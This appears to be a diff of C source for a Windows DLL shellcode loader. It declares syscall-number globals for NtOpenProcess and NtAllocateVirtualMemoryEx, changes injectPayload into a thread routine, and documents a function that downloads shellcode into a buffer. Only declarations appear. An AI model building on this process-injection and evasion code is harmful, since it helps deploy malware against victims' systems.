@@ -14,7 +14,6 @@
     (p)->SecurityQualityOfService = NULL; \
 }
 
-
 DWORD g_NtOpenProcessSSN;
 QWORD g_NtOpenProcessSyscall;
 DWORD g_NtAllocateVirtualMemoryExSSN;
@@ -166,7 +165,7 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved);
  *                    Must not be NULL.
  * @return DWORD Process ID if the process exists, otherwise returns 0.
  */
-BOOL injectPayload();
+DWORD WINAPI injectPayload(LPVOID param);
 
 /**
  * @brief Downloads a shellcode payload into the provided buffer.
